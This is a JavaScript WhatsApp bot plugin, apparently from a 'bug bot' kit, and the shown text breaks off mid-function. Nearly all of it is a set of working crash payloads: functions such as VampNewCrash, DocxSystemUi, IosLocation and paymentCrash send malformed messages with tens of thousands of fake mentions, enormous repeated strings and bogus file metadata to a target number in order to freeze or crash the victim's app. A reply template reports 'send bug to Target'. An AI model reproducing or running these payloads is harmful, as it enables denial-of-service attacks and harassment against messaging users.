import { 
getContentType, 
generateWAMessage, 
generateWAMessageFromContent, 
generateWAMessageContent,
prepareWAMessageMedia, 
downloadContentFromMessage
} from "@adiwajshing/baileys"
const { proto } = (await import('@adiwajshing/baileys')).default
import fs from 'fs-extra'
import util from 'util'
import crypto from 'crypto'
import chalk from 'chalk'
let handler = async (m, { conn, usedPrefix, command, text, args, isBotAdmin, isAdmin, isOwner }) => {
const rafiacces = JSON.parse(fs.readFileSync("./Storage/Json/rafimurbug.json"));
const isbot = [global.conn.user.jid].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);
const ismurbug = [global.conn.user.jid, ...rafiacces].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);
let prefix = usedPrefix
let rafiganteng = conn
const q = text
const fatkuns = m.quoted || m;
const quoted = ["buttonsMessage", "templateMessage", "product"].includes(fatkuns.mtype)
? fatkuns[Object.keys(fatkuns)[1] || Object.keys(fatkuns)[0]]
: fatkuns;
async function doneress() {
if (!q) throw "Done Response"
let pepec = q.replace(/[^0-9]/g, "")
let ressdone = `
 𝚂𝚞𝚌𝚌𝚎𝚜 𝚜𝚎𝚗𝚍 𝚋𝚞𝚐 𝚝𝚘 𝚃𝚊𝚛𝚐𝚎𝚝!
*${command}* Sent To : 
 ${pepec}

⏳ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗣𝗮𝘂𝘀𝗲 𝟱 𝗠𝗶𝗻𝘂𝘁𝗲𝘀🎭〽️` 

let buttons = [
        { buttonId: ".allmenu", buttonText: { displayText: "𝐁𝐚𝐜𝐤 𝐓𝐨 𝐦𝐞𝐧𝐮" } }
    ];

    let buttonMessage = {
        image: {url: global.menu.tampilan },
        caption: ressdone,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363400514002870@newsletter",
                newsletterName: "CODINGAN RAFI"
            }
        },
        footer: "RAFI HACKER",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };
await rafiganteng.sendMessage(m.chat, buttonMessage, { quoted: m });
}
const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
const bugres = 'Sending bug process....'

async function VampNewCrash(target, mention = true) {
  const delaymention = Array.from({ length: 30000 }, (_, r) => ({
    title: "᭡꧈".repeat(95000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }],
  }));

  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "DilxzВаэлтрикс͢ ϟ",
          listType: 2,
          buttonText: null,
          sections: delaymention,
          singleSelectReply: { selectedRowId: "🔴" },
          contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "",
              serverMessageId: 1,
              newsletterName: "",
            },
          },
          description: '\u0003',
        },
      },
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2,
    },
  };

  const msg = generateWAMessageFromContent(target, MSG, {});

  await rafiganteng.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
          },
        ],
      },
    ],
  });

  if (mention) {
    await rafiganteng.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "DilxzВаэлтрикс͢ ϟ‌" },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function DocxSystemUi(target) {
    try {
        const documentMessage = {
            url: "https://mmg.whatsapp.net/v/t62.7119-24/11923856_1474185146798290_6048054041675266856_n.enc?ccb=11-4&oh=01_Q5Aa1gGK5NXiXioJlvQ8QU3BT5oshVKOXjEPT4EUSbNFo4IkIQ&oe=686B0FA7&_nc_sid=5e03e0&mms3=true",
            title: "\u0003".repeat(900000000),
            fileSha256: "tJxI2OsQ2EwgEIcTNo8DLmYcKvYPrYDfxxbIpvmczfU=",
            mediaKey: "89tK2gWWAKun8dxalKD7WO5e3SE1GF7pIdwbh6prkxw=",
            mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            fileName: "DilxzВаэлтрикс͢ ϟ",
            fileEncSha256: "3e4rMVkvA+g47xtcIm16hHnDrTk5efdFNjuXpcMfzgo=",
            directPath: "/v/t62.7119-24/11923856_1474185146798290_6048054041675266856_n.enc?ccb=11-4&oh=01_Q5Aa1gGK5NXiXioJlvQ8QU3BT5oshVKOXjEPT4EUSbNFo4IkIQ&oe=686B0FA7&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 1, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            contactVcard: false,
            contextInfo: {
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from(
                        {
                            length: 40000,
                        },
                        () =>
                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                    ),
                ]
            }
        }

        let msg = generateWAMessageFromContent(target, {
            viewOnceMessage: { message: { documentMessage } }
        }, {});

        await rafiganteng.relayMessage(target, msg.message, { participants: { jid: target }, messageId: msg.key.id });
    } catch (err) {
    }
}

async function CursorCrL(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: 'DilxzВаэлтрикс͢ ϟ',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "1649999999089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "DilxzВаэлтрикс͢ ϟ"
                },
                footer: {
                  text: "DilxzВаэлтрикс͢ ϟ"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ phynx.json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await rafiganteng.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function LocUiNew(target, Ptcp = true) {
  try {
    await rafiganteng.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "DilxzВаэлтрикс͢ ϟ\n" +
                  "ꦾ".repeat(92000) +
                  "ꦽ".repeat(92000) +
                  `@1`.repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "", 
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}

async function letterCrash(target, Ptcp = true) {
  let virtex = "___" + "ꦾ".repeat(77777) + "@1".repeat(77777);
  var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: `@newsletter`,
          newsletterName: virtex,
          jpegThumbnail: "",
          caption: virtex,
          inviteExpiration: Date.now() + 1814400000
        },
        contextInfo: {
          mentionedJid: ["13135550002@s.whatsapp.net"],
          groupMentions: [
            {
              groupJid: `120363319314627296@newsletter`,
              groupSubject: virtex
            }
          ]
        }
      }
    }
  }), {
    userJid: target
  });

  await rafiganteng.relayMessage(target, messageContent.message, {
    participant: { jid: target },
    messageId: messageContent.key.id
  });
}

async function UiScorpio(target) {
    const messagePayload = {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "999999999999",
                                pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: "DilxzВаэлтрикс͢ ϟ",
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1715880173"
                            },
                        hasMediaAttachment: true
                    },
                    body: {
                            text: "DilxzВаэлтрикс͢ ϟ" + "ꦾ".repeat(150000) + "@1".repeat(250000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "" }],
                        isForwarded: true,
                        quotedMessage: {
								documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "999999999999",
											pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "DilxzВаэлтрикс͢ ϟ",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
						}
                    }
                    }
                }
            }
        }
    };

    rafiganteng.relayMessage(target, messagePayload, {}, { messageId: null });
}

async function protocol5(target, mention = true) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "DilxzВаэлтрикс͢ ϟ" + "ោ៝".repeat(10000),
        title: "DilxzВаэлтрикс͢ ϟ",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "DilxzВаэлтрикс͢ ϟ",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "@newsletter",
            serverMessageId: 1,
            newsletterName: "ϟ"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await rafiganteng.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await rafiganteng.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function protocolxaudio(target, mention = true) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from([
            226, 213, 217, 102, 205, 126, 232, 145,
            0,  70, 137,  73, 190, 145,   0,  44,
            165, 102, 153, 233, 111, 114,  69,  10,
            55,  61, 186, 131, 245, 153,  93, 211
        ]),
        fileLength: 432722,
                    seconds: 26,
                    ptt: false,
                    mediaKey: Buffer.from([
            182, 141, 235, 167, 91, 254,  75, 254,
            190, 229,  25,  16, 78,  48,  98, 117,
            42,  71,  65, 199, 10, 164,  16,  57,
            189, 229,  54,  93, 69,   6, 212, 145
        ]),
        fileEncSha256: Buffer.from([
            29,  27, 247, 158, 114,  50, 140,  73,
            40, 108,  77, 206,   2,  12,  84, 131,
            54,  42,  63,  11,  46, 208, 136, 131,
            224,  87,  18, 220, 254, 211,  83, 153
        ]),
                    directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1746275400,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await rafiganteng.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await rafiganteng.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "X" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function locationInvis(target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                liveLocationMessage: {
                    degreesLatitude: -9.09999262999,
                    degreesLongitude: 199.99963118999,
                    caption: "DilxzВаэлтрикс͢ ϟ" + "𑇂𑆵𑆴𑆿".repeat(10000),
                    sequenceNumber: '0',
                    jpegThumbnail: '',
                contextInfo: {
                    mentionedJid: Array.from({
                        length: 30000
                    }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                    isSampled: true,
                    participant: target,
                    remoteJid: "status@broadcast",
                    forwardingScore: 9741,
                    isForwarded: true
                }
            }
        }
    }
};

const msg = generateWAMessageFromContent(target, generateMessage, {});

await rafiganteng.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
                tag: "to",
                attrs: {
                    jid: target
                },
                content: undefined
            }]
        }]
    }]
});
}

async function bulldozer(target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});
if (!msg.key || !msg.key.id) {
  msg.key = {
    remoteJid: target,
    fromMe: true,
    id: (Math.random() * 1e16).toString(36)
  };
}


  await rafiganteng.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function IosLocation(target) {
  try {
    const IphoneCrash = "DilxzВаэлтрикс͢ ϟ" + "𑇂𑆵𑆴𑆿".repeat(60000);
    await rafiganteng.relayMessage(target, {
      locationMessage: {
        degreesLatitude: 11.11,
        degreesLongitude: -11.11,
        name: "\u0003               " + IphoneCrash,
        url: "https://youtube.com/@dilxzdev"
      }
    }, {
      participant: { jid: target }
    });
  } catch (error) {
    console.error("ERROR SENDING:", error);
  }
}	

async function TrashIos(target, Ptcp = false) {
  await rafiganteng.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: "DilxzВаэлтрикс͢ ϟ",
        contextInfo: {
          stanzaId: "1234567890ABCDEF",
          participant: "13135550002@s.whatsapp.net",
          quotedMessage: {
            callLogMesssage: {
              isVideo: true,
              callOutcome: "1",
              durationSecs: "0",
              callType: "REGULAR",
              participants: [
                {
                  jid: "13135550002@s.whatsapp.net",
                  callOutcome: "1"
                }
              ]
            }
          },
          remoteJid: target,
          conversionSource: "source_example",
          conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
          conversionDelaySeconds: 10,
          forwardingScore: 9999999,
          isForwarded: true,
          quotedAd: {
            advertiserName: "Example Advertiser",
            mediaType: "IMAGE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
            caption: "DilxzВаэлтрикс͢ ϟ"
          },
          placeholderKey: {
            remoteJid: "6289501955295@s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          },
          expiration: 86400,
          ephemeralSettingTimestamp: "1728090592378",
          ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
          externalAdReply: {
            title: "🩸",
            body: "Trash Ios ϟ",
            mediaType: "VIDEO",
            renderLargerThumbnail: true,
            previewTtpe: "VIDEO",
            thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
            sourceType: " x ",
            sourceId: " x ",
            sourceUrl: "https://youtube.com/@dilxzdev",
            mediaUrl: "https://youtube.com/@dilxzdev",
            containsAutoReply: true,
            showAdAttribution: true,
            ctwaClid: "ctwa_clid_example",
            ref: "ref_example"
          },
          entryPointConversionSource: "entry_point_source_example",
          entryPointConversionApp: "entry_point_app_example",
          entryPointConversionDelaySeconds: 5,
          disappearingMode: {},
          actionLink: {
            url: "https://youtube.com/@dilxzdev"
          },
          groupSubject: "Example Group Subject",
          parentGroupJid: "6287888888888-1234567890@g.us",
          trustBannerType: "trust_banner_example",
          trustBannerAction: 1,
          isSampled: false,
          utm: {
            utmSource: "utm_source_example",
            utmCampaign: "utm_campaign_example"
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: "6287888888888-1234567890@g.us",
            serverMessageId: 1,
            newsletterName: " X ",
            contentType: "UPDATE",
            accessibilityText: " X "
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net"
          },
          smbClientCampaignId: "smb_client_campaign_id_example",
          smbServerCampaignId: "smb_server_campaign_id_example",
          dataSharingContext: {
            showMmDisclosure: true
          }
        }
      }
    },
    Ptcp ? { participant: { jid: target } } : {}
  );
}


async function CrashJids(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
              order: {
                status: "completed",
                order_type: "ORDER"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: {}
      }
   }
  }, { userJid: target });

  await rafiganteng.relayMessage(target, msg.message, { 
    messageId: msg.key.id 
  });
}

async function extendetX(target) {
rafiganteng.relayMessage(target, {
'extendedTextMessage': {
'text': '.',
'contextInfo': {
'stanzaId': target,
'participant': target,
'quotedMessage': {
							'conversation': 'DilxzВаэлтрикс͢ ϟ' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': target
				}
			}, {
				'messageId': null
			});
			console.log(chalk.green(""));
		};

async function buttoncast(target) {
  const buttons = [];

  for (let i = 0; i < 1000; i++) {
    buttons.push({
      name: `order_${i + 1}`,
      buttonParamsJson: {
        reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
        order: {
          status: "completed",
          order_type: "ORDER"
        },
        share_payment_status: true
      }
    });
  }

  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: buttons,
        messageParamsJson: {
          title: "?",
          body: "#"
        }
      }
    }
  }, { userJid: target });

  await rafiganteng.relayMessage(target, msg.message, { 
    messageId: msg.key.id 
  });
}

async function paymentCrash(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: JSON.stringify({
              reference_id: Math.random().toString(36).substring(2, 10).toUpperCase(),
              order: {
                status: "pending", 
                order_type: "ORDER"
              },
              share_payment_status: true,
              call_permission: true 
            })
          },
          {
            name: "contact", 
            buttonParamsJson: JSON.stringify({
              vcard: {
                full_name: "DilxzВаэлтрикс͢ ϟ".repeat(4000),
                phone_number: "+6289500000000",
                email: "@iCloud.com",
                organization: "DilxzВаэлтрикс͢ ϟ",
                job_title: "Customer Support"
              }
            })
          }
        ],
        messageParamsJson: JSON.stringify({
          title: "\u200B".repeat(10000), 
          body: "GIDEOVA_PAYMENT_STATUSED"
        })
      }
    }
  }, { userJid: target });

  await rafiganteng.relayMessage(target, msg.message, { 
    messageId: msg.key.id
  });
}

async function buttonscrashX(target, Ptcp = true) {
  try {
    await rafiganteng.relayMessage(
      target,
      {
